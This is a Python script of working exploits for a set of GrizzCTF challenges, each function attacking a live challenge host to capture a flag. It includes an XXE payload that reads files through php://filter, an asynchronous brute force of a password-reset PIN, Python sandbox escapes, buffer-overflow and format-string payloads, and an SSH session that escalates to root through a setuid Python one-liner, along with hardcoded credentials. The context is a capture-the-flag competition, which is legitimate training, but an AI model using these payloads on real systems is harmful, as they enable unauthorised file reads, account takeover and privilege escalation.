from pwn import *
import asyncio
import aiohttp
import hashlib
import re
import string
import random
import time
from bs4 import BeautifulSoup
from hashlib import sha256
import requests
from Crypto.Cipher import AES
from Crypto.Util.number import long_to_bytes, inverse, GCD
from Crypto.Util.Padding import unpad
import itertools
import base64
import math
import numpy as np
from scipy.optimize import least_squares
import randcrack
import paramiko


class COLORS:
    HEADER: str = '\033[95m'
    OKBLUE: str = '\033[94m'
    OKCYAN: str = '\033[96m'
    OKGREEN: str = '\033[92m'
    WARNING: str = '\033[93m'
    FAIL: str = '\033[91m'
    ENDC: str = '\033[0m'
    BOLD: str = '\033[1m'
    UNDERLINE: str = '\033[4m'



def solve_dad_joke_crypto():
    """
    Exploits the Dad-Joke-Crypto challenge at 
    https://grizzhacks-dad-joke-crypto.chals.io/ by performing:
      1. Retrieval of the PoW challenge and its CSRF token.
      2. Solving the PoW challenge.
      3. Submitting the solution to obtain an authenticated session.
      4. Fetching challenge parameters and the encrypted flag.
      5. Factorizing parameters and recovering the AES key.
      6. Decrypting the flag.
    
    Returns:
        str: A color-coded string containing the flag if successful,
             otherwise a failure message.
    """
    

    # Use the COLORS class defined globally (or redefine here)

    def solve_pow(challenge: str, difficulty: int = 6) -> str:
        target = '0' * difficulty
        #print(f"{COLORS.OKBLUE}[+] Solving PoW for challenge: {challenge}{COLORS.ENDC}")
        charset = string.ascii_lowercase + string.digits
        start_time = time.time()
        for length in range(1, 10):
            for candidate in itertools.product(charset, repeat=length):
                x = ''.join(candidate)
                h = sha256((challenge + x).encode()).hexdigest()
                if h.startswith(target):
                    total_time = time.time() - start_time
                    #print(f"{COLORS.OKGREEN}[+] Found PoW solution: {x} (Hash: {h}) in {total_time:.2f}s{COLORS.ENDC}")
                    return x
        #print(f"{COLORS.FAIL}[-] No PoW solution found! This should not happen.{COLORS.ENDC}")
        return ""

    base_url = "https://grizzhacks-dad-joke-crypto.chals.io/"
    s = requests.Session()
    try:
        # (Optional) Get main page to extract a CSRF token (if used)
        resp = s.get(base_url)
        soup = BeautifulSoup(resp.text, "html.parser")
        csrf_token = None
        csrf_input = soup.find('input', {'name': 'csrf_token'})
        if csrf_input:
            csrf_token = csrf_input.get('value')
        #    print(f"{COLORS.OKBLUE}[+] Found CSRF token: {csrf_token}{COLORS.ENDC}")

        
        pow_url = base_url + "pow"
        resp = s.get(pow_url)
        resp.raise_for_status()
        soup = BeautifulSoup(resp.text, "html.parser")

        pow_csrf_token = None
        csrf_input = soup.find('input', {'name': 'csrf_token'})
        if csrf_input:
            pow_csrf_token = csrf_input.get('value')

        challenge = None
        code_element = soup.select_one("div.code-highlight code")
        if code_element:
            line = code_element.get_text().strip()
            start_idx = line.find('sha256("') + len('sha256("')
            end_idx = line.find('"+x')
            if start_idx != -1 and end_idx != -1:
                challenge = line[start_idx:end_idx]

        if not challenge:
            #print(f"{COLORS.FAIL}[-] Could not find the PoW challenge in /pow page.{COLORS.ENDC}")
            return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"

        x = solve_pow(challenge)
        if not x:
            #print(f"{COLORS.FAIL}[-] PoW solution could not be found, aborting.{COLORS.ENDC}")
            return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"

        #print(f"{COLORS.HEADER}=== Step 2: Submit PoW Solution ==={COLORS.ENDC}")
        data = {"solution": x}
        if pow_csrf_token:
            data["csrf_token"] = pow_csrf_token

        resp = s.post(pow_url, data=data)
        resp.raise_for_status()
        if "Incorrect proof-of-work solution" in resp.text:
            #print(f"{COLORS.FAIL}[-] PoW solution was not accepted{COLORS.ENDC}")
            return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"
        #print(f"{COLORS.OKGREEN}[+] PoW solved! Authenticated session obtained.{COLORS.ENDC}")

        #print(f"{COLORS.HEADER}=== Step 3: Fetch Challenge Parameters and Ciphertext ==={COLORS.ENDC}")
        challenge_url = base_url + "challenge"
        headers = {"Accept": "application/json", "Content-Type": "application/json"}
        resp = s.get(challenge_url, headers=headers)
        resp.raise_for_status()
        try:
            data = resp.json()
        except requests.exceptions.JSONDecodeError as e:
            #print(f"{COLORS.FAIL}[-] JSON decode error. Response content: {resp.text[:200]}{COLORS.ENDC}")
            return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"

        n_str = data["alice"]["n"]
        vka_str = data["alice"]["vka"]
        vkakb_str = data["alice"]["vkakb"]
        vkb_str = data["bob"]["vkb"]
        c_hex = data["ciphertext"]

        n = int(n_str)
        vka = int(vka_str)
        vkakb = int(vkakb_str)
        vkb = int(vkb_str)

        #print(f"{COLORS.OKBLUE}[+] Retrieved parameters. n has {len(n_str)} digits{COLORS.ENDC}")
        #print(f"{COLORS.OKBLUE}[+] Encrypted flag retrieved: {c_hex[:60]}...{COLORS.ENDC}")

        #print(f"{COLORS.HEADER}=== Step 4: Factorization and Key Recovery ==={COLORS.ENDC}")
        p_val = GCD(n, vka)
        if p_val == 1:
            p_val = GCD(n, vkakb)
        if p_val == 1:
            p_val = GCD(n, vkb)
        if p_val == 1:
            #print(f"{COLORS.FAIL}[-] Could not factor n from given parameters.{COLORS.ENDC}")
            return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"
        q_val = n // p_val

        vka_prime = vka // p_val
        vkakb_prime = vkakb // p_val
        vkb_prime = vkb // p_val

        modulus = q_val

        inv_vka_prime = inverse(vka_prime, modulus)
        k_B = (vkakb_prime * inv_vka_prime) % modulus

        inv_vkb_prime = inverse(vkb_prime, modulus)
        k_A = (vkakb_prime * inv_vkb_prime) % modulus

        inv_k_A = inverse(k_A, modulus)
        r_val = (vka_prime * inv_k_A) % modulus

        v_val = p_val * r_val

        key = sha256(long_to_bytes(v_val)).digest()

        c_bytes = bytes.fromhex(c_hex)
        iv_bytes = c_bytes[:AES.block_size]
        ciphertext_bytes = c_bytes[AES.block_size:]

        cipher = AES.new(key, AES.MODE_CBC, iv=iv_bytes)
        decrypted = cipher.decrypt(ciphertext_bytes)

        try:
            flag = unpad(decrypted, 16)
            flag_str = flag.decode()
            #print(f"{COLORS.OKGREEN}[+] Flag recovered: {flag_str}{COLORS.ENDC}")
            return f"{COLORS.OKGREEN}Flag (dad_joke_crypto, Web): {flag_str}{COLORS.ENDC}"
        except ValueError:
            #print(f"{COLORS.WARNING}[!] Padding incorrect - either key or ciphertext mismatch.{COLORS.ENDC}")
            #print(f"{COLORS.WARNING}[!] The server may have regenerated parameters. Try again quickly.{COLORS.ENDC}")
            return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"
    except Exception as e:
        #print(f"{COLORS.FAIL}Exception: {e}{COLORS.ENDC}")
        return f"{COLORS.FAIL}Flag (dad_joke_crypto, Web): None{COLORS.ENDC}"
    finally:
        s.close()


def solve_quack():
    # Quack-rock-paper-scissors challenge solution
    host, port = '167.99.228.17', 8845
    p = remote(host, port)
    cracker = randcrack.RandCrack()
    p.recvuntil(b"Select an option:")
    p.sendline(b"2")
    p.recvuntil(b"Here are your quacks (624 32-bit integers):")
    p.recvline()
    quacks =  p.recvline().decode().split('[')[1].split(']')[0]
    quacks = [int(q) for q in quacks.split(',')]
    

    for i in range(len(quacks)):
        cracker.submit(quacks[i])


    choices = ["quackrock", "quackpaper", "quackscissors"]
    winning_choices = {
        "quackrock": "quackpaper",
        "quackpaper": "quackscissors",
        "quackscissors": "quackrock"
    }

    correct_choices = [winning_choices[choices[cracker.predict_randint(0, 2)]] for _ in range(10)]


    p.sendline(b"1")
    for i in range(len(correct_choices)):
        p.recvuntil(b"Choose (quackrock, quackpaper, quackscissors):")
        p.sendline(correct_choices[i].encode())

    data = p.recvall(timeout=2).decode()
    pattern = r"GrizzCTF\{.*?\}"
    match = re.search(pattern, data)
    return f"{COLORS.OKGREEN}Flag (quack, Misc): {match.group(0) if match else 'None'}{COLORS.ENDC}"

def endgame():

    context.log_level = 'info'

    def initial_bearing(lat1, lon1, lat2, lon2):
        phi1, phi2 = math.radians(lat1), math.radians(lat2)
        d_lambda = math.radians(lon2 - lon1)
        y = math.sin(d_lambda)*math.cos(phi2)
        x = math.cos(phi1)*math.sin(phi2) - math.sin(phi1)*math.cos(phi2)*math.cos(d_lambda)
        bearing = math.degrees(math.atan2(y, x))
        return (bearing + 360) % 360

    def angle_diff(a, b):
        return (a - b + 180) % 360 - 180

    def bearing_residuals(vars, towers):
        lat_guess, lon_guess = vars
        res = []
        for (t_lat, t_lon, given_bearing) in towers:
            calc_bearing = initial_bearing(t_lat, t_lon, lat_guess, lon_guess)
            diff = angle_diff(calc_bearing, given_bearing)
            res.append(diff)
        return res

    def triangulate_nonlinear(towers):
        avg_lat = sum(t[0] for t in towers) / len(towers)
        avg_lon = sum(t[1] for t in towers) / len(towers)
        result = least_squares(bearing_residuals, [avg_lat, avg_lon],
                               args=(towers,), ftol=1e-12, xtol=1e-12, max_nfev=5000)
        return tuple(map(lambda x: round(x, 6), result.x)) if result.success else (None, None)

    HOST, PORT = '167.99.228.17', 8003

    try:
        io = remote(HOST, PORT)
        io.recvuntil(b"Good luck, Operator!", timeout=10)

        for problem_num in range(1, 6):
            problem_data = io.recvuntil(f"Enter your answer for Problem {problem_num}: ".encode(), timeout=10)
            towers_data = re.findall(r"(\w+): Location = \(([-\d\.]+), ([-\d\.]+)\), Bearing = ([\d\.]+)°", problem_data.decode())

            if len(towers_data) != 3:
                io.sendline(b"0.00,0.00")
                io.close()
                return False

            towers = [(float(lat), float(lon), float(bearing)) for _, lat, lon, bearing in towers_data]

            phone_lat, phone_lon = triangulate_nonlinear(towers)

            if phone_lat is None or phone_lon is None:
                io.sendline(b"0.00,0.00")
                io.close()
                return False

            io.sendline(f"{phone_lat},{phone_lon}".encode())

            resp = io.recvline(timeout=5)
            if b"Correct!" not in resp:
                io.close()
                return False

        final_message = io.recvall(timeout=10).decode()
        io.close()
        pattern = r"GrizzCTF\{.*?\}"
        match = re.search(pattern, final_message)
        return f"{COLORS.OKGREEN}Flag (endgame, Misc): {match.group(0) if match else 'None'}{COLORS.ENDC}"

    except Exception as e:
        print(f"Healthcheck failed: {e}")
        return False

def solve_xxehhh():
    """
    Exploits the XXE vulnerability using php://filter to read and base64‑encode the file.
    This function sends a POST request to http://localhost:80/process.php with a crafted
    XML payload that instructs the PHP process to load 'flag.txt'. It then extracts and decodes
    the base64-encoded flag from the response.
    
    Returns:
        str: The flag if extraction is successful.
        
    Raises:
        Exception: If there is an HTTP error, or if the flag cannot be extracted or decoded.
    """


    url = "https://grizzhacks-xxehhh.chals.io/process.php"
    file_path = "flag.txt"
    payload = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
'''
    headers = {"Content-Type": "application/xml"}

    # Send the payload to the target URL.
    response = requests.post(url, data=payload, headers=headers, timeout=10)
    if response.status_code != 200:
        raise Exception(f"HTTP error: received status code {response.status_code}")

    # Look for our markers. We expect a base64 string to appear between "OUT" markers.
    match = re.search(r'OUT([A-Za-z0-9+/=]+)OUT', response.text)
    if not match:
        raise Exception("Failed to extract flag from response. Full response:\n" + response.text)

    encoded_flag = match.group(1)
    try:
        flag = base64.b64decode(encoded_flag).decode("utf-8")
    except Exception as e:
        raise Exception(f"Error decoding flag: {e}")

    return f"{COLORS.OKGREEN}Flag (XXehhh, Web): {flag}{COLORS.ENDC}"

async def solve_pin_in_the_bin(url: str="https://grizzhacks-pin-in-the-bin.chals.io") -> None:
    """
    Runs the complete exploit against the target URL and prints the retrieved flag.
    
    Steps performed:
      1. Retrieves the PoW challenge from /pow, extracts the challenge string and CSRF token.
      2. Solves the PoW challenge locally (brute forcing an 8-character candidate whose SHA256 hash
         of (challenge + candidate) starts with '00' [difficulty=2]).
      3. Submits the PoW solution to /pow.
      4. Triggers the forgot-password functionality for admin@secureauth.com.
      5. Brute forces the PIN (from 1000 to 9999, in batches) on /verify-pin until the flag (containing "GrizzCTF{")
         is found.
         
    All output is printed to stdout.
    """
    session = aiohttp.ClientSession()
    try:
        base_url = url.rstrip('/')
        
        
        # Step 1: Retrieve PoW challenge and CSRF token from /pow
        async with session.get(f"{base_url}/pow") as resp:
            html = await resp.text()
        match = re.search(r'Challenge String:</strong>\s*<code>([a-f0-9]+)</code>', html)
        if not match:
            
            return
        challenge_str = match.group(1)
        soup = BeautifulSoup(html, 'html.parser')
        csrf_input = soup.find('input', attrs={'name': 'csrf_token'})
        if csrf_input:
            csrf_token = csrf_input['value']
        else:
            
            return
        
        
        # Step 2: Solve PoW locally (difficulty = 2, target: hash starts with '00')
        difficulty = 2
        target = '0' * difficulty
        start_time = time.time()
        attempts = 0
        solution = None
        charset = string.ascii_letters + string.digits
        while True:
            attempts += 1
            candidate = ''.join(random.choices(charset, k=8))
            h = hashlib.sha256((challenge_str + candidate).encode()).hexdigest()
            if h.startswith(target):
                solution = candidate
                elapsed = time.time() - start_time
                
                break
            if attempts % 500000 == 0:
                print(f"[-] PoW attempts so far: {attempts}...", end='\r')
        
        # Step 3: Submit PoW solution
        data = {'csrf_token': csrf_token, 'solution': solution}
        async with session.post(f"{base_url}/pow", data=data, allow_redirects=True) as resp:
            html = await resp.text()
        if "Proof of Work challenge solved successfully!" in html:
            pass
        else:
            return
        
        # Step 4: Trigger forgot-password for admin@secureauth.com
        
        async with session.get(f"{base_url}/forgot-password") as resp:
            get_html = await resp.text()
        soup = BeautifulSoup(get_html, 'html.parser')
        csrf_input = soup.find('input', attrs={'name': 'csrf_token'})
        csrf_forgot = csrf_input['value'] if csrf_input else None
        if not csrf_forgot:
            pass
        else:
            data = {'csrf_token': csrf_forgot, 'email': 'admin@secureauth.com'}
            async with session.post(f"{base_url}/forgot-password", data=data, allow_redirects=True) as resp:
                post_html = await resp.text()
            if 'If an account exists with this email' in post_html:
                pass
            else:
                pass
        # Step 5: Brute force PIN to retrieve the flag
        async def try_pin(pin: int):
            async with session.get(f"{base_url}/verify-pin") as get_resp:
                get_html = await get_resp.text()
            soup = BeautifulSoup(get_html, 'html.parser')
            csrf_input = soup.find('input', attrs={'name': 'csrf_token'})
            csrf_pin = csrf_input['value'] if csrf_input else None
            if not csrf_pin:
                return None, pin
            data = {'csrf_token': csrf_pin, 'pin': f"{pin:04d}"}
            async with session.post(f"{base_url}/verify-pin", data=data, allow_redirects=True) as resp:
                text = await resp.text()
            if 'GrizzCTF{' in text:
                m = re.search(r'(GrizzCTF\{[^}]+\})', text)
                flag = m.group(1) if m else "UnknownFlag"
                return flag, pin
            return None, pin
        
        found_flag = None
        found_pin = None
        total_attempts = 0
        for current_start in range(1000, 10000, 20):
            tasks = [asyncio.create_task(try_pin(pin)) for pin in range(current_start, min(current_start + 20, 10000))]
            results = await asyncio.gather(*tasks)
            total_attempts += len(tasks)
            for res in results:
                flag, pin = res
                if flag is not None:
                    found_flag = flag
                    found_pin = pin
                    break
            if found_flag:
                return f"{COLORS.OKGREEN}Flag (pin-in-the-bin, Web): {found_flag}{COLORS.ENDC}"
                break
            pass
        
        if found_flag:
            pass
        else:
            pass
    
    except Exception as e:
        pass
    finally:
        await session.close()

def solve_bp1():
    host, port = '167.99.228.17', 8001
    io = remote(host, port)
    io.sendline(b"blacklist.clear()")
    

    io.sendline(b"print(open('flag.txt').read())")
    
    line = io.recvall(timeout=3).decode('utf-8')
    pattern = r'GrizzCTF\{.*?\}'
    match = re.search(pattern, line)
    
    io.close()
    return f"{COLORS.OKGREEN}Flag (bp1, Misc): {match.group(0) if match else 'None'}{COLORS.ENDC}"

def solve_bp2():
    p = remote('167.99.228.17', 8002)
    payload = "print(open('flag.txt').read())"
    fmt = '+'.join(f'chr({ord(c)})' for c in payload)
    p.sendlineafter(b'<<[cmd]>> ', fmt.encode())
    data = p.recvall(timeout=3).decode('utf-8')
    pattern = r'GrizzCTF\{.*?\}'
    match = re.search(pattern, data)
    
    p.close()
    return f"{COLORS.OKGREEN}Flag (bp2, Misc): {match.group(0) if match else 'None'}{COLORS.ENDC}"

    

def solve_mally():
    pattern = r"GrizzCTF\{.*?\}"
    url = 'https://grizzhacks-mallys-restaurant.chals.io/'
    resp = requests.get(url)
    match = re.search(pattern, resp.text)
    return f"{COLORS.OKGREEN}Flag (mally, Misc): {match.group(0) if match else 'None'}{COLORS.ENDC}"

def solve_pwngs():
    # connect to 167.99.228.17 9001
    io = remote("167.99.228.17", 9001)
    io.sendline(b"A"*80)
    data = io.recvall(timeout=3).decode('utf-8')
    pattern = r"GrizzCTF\{.*?\}"
    match = re.search(pattern, data)
    flag = match.group(0) if match else "None"
    io.close()
    return f"{COLORS.OKGREEN}Flag (pwngs, Misc): {flag}{COLORS.ENDC}"

def solve_not_juan():
    io = remote("167.99.228.17", 9002)
    payload = b"A" * 40 + p64(0xffffffffffffffff)
    io.sendline(payload)
    io.sendline(b'cat flag.txt')
    data = io.recvall(timeout=3).decode('utf-8')
    pattern = r"GrizzCTF\{.*?\}"
    match = re.search(pattern, data)
    flag = match.group(0) if match else "None"
    io.close()
    return f"{COLORS.OKGREEN}Flag (not_juan, Misc): {flag}{COLORS.ENDC}"



def solve_devsec():
    hostname = '167.99.228.17'
    port = 1022
    username = 'ctfuser'  # Replace with your actual username
    password = 'CTF_password2023!'  # Replace with your actual password
    flag_pattern = r"GrizzCTF\{.*?\}"
    # Initialize SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Connect to SSH
        ssh.connect(hostname=hostname, port=port, username=username, password=password)
        shell = ssh.invoke_shell()
        time.sleep(1)
        shell.send('cat ~/user.txt\n')
        time.sleep(1)
        output_user = shell.recv(4096).decode()
        shell.send('bin/python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\'\n')
        time.sleep(1)
        shell.recv(4096)
        shell.send('cat /root/root.txt\n')
        time.sleep(1)
        output_root = shell.recv(4096).decode()
        ssh.close()
        flag1, flag2 = re.search(flag_pattern, output_user), re.search(flag_pattern, output_root)
        user_flag = flag1.group(0) if flag1 else "None"
        root_flag = flag2.group(0) if flag2 else "None"

        return f"{COLORS.OKGREEN}User flag: {user_flag}, Root flag:{root_flag}{COLORS.ENDC}"

    except paramiko.SSHException as e:
        print(f"SSH connection failed: {e}")
        return None, None

def solve_fmterr():
    host, port = '167.99.228.17', 9004
    io = remote(host, port)
    secret_value = 0x41424344
    context.arch = 'amd64'
    elf = ELF('./chal')
    offset = 6
    payload = fmtstr_payload(offset, {elf.symbols['secret']: secret_value}, write_size='short')
    io.sendline(payload)
    io.recvuntil(b'The ancient prophecy has been fulfilled! Behold your reward: ')
    
    flag_pattern = r"GrizzCTF\{.*?\}"
    data = io.recvall(timeout=3).decode()
    flag = re.search(flag_pattern, data).group(0)
    io.close()
    return f"{COLORS.OKGREEN}{flag}{COLORS.ENDC}"

from solve import VigenereSolver, DecryptionResult


def solve_vigenere():
    solver = VigenereSolver()
    flag_pattern = r"GRIZZCTF[A-Z0-9_]*FLAG"
    host, port = '0.cloud.chals.io', 15366
    attempt = 0
    while True:
        attempt += 1
        print(f"Attempt #{attempt}: Connecting to {host}:{port}")
        try:
            io = remote(host, port)
            ciphertext = io.recvall(timeout=2).decode()
            io.close()
            ciphertext = ciphertext.replace(
                """------------------------------------------------Vigenere Strikes Back------------------------------------------------\n\n""", ""
            ).strip()

            ciphertext = ciphertext.replace(
                "Hint: The flag is all uppercase letters, starts with GRIZZCTF, and '{}' has been removed from the flag.",
                ""
            ).strip().upper()
            result = solver.solve(ciphertext)
            print(f"Decrypted candidate: {result.decrypted}")
            
            match = re.search(flag_pattern, result.decrypted)
            if match:
                found_flag = match.group(0)
                return found_flag
        except Exception as e:
            print(f"An error occurred: {e}")
            continue  
    
def main():
    flags = []
    flags.append(('(Web, mally)', solve_mally()))
    flags.append(('(Web, xxehhh)', solve_xxehhh()))
    flags.append(('(Web, pin-in-the-bin)', asyncio.run(solve_pin_in_the_bin())))
    flags.append(('(Web, DevSec? No thanks! 1 & 2)', solve_devsec()))
    flags.append(('(Misc, bp1)', solve_bp1()))
    flags.append(('(Misc, bp2)', solve_bp2()))
    flags.append(('(Misc, endgame)', endgame()))
    flags.append(('(Pwn, pwngs)', solve_pwngs()))
    flags.append(('(Pwn, not_juan)', solve_not_juan()))
    flags.append(('(Pwn, fmterr1)', solve_fmterr()))
    flags.append(('(Misc, quack)', solve_quack()))
    flags.append(('(Crypto, dad_joke_crypto)', solve_dad_joke_crypto()))
    flags.append(('(Crypto, vigenere)', solve_vigenere()))
    for flag in flags:
        print(flag[0], flag[1])

if __name__ == "__main__":
    main()
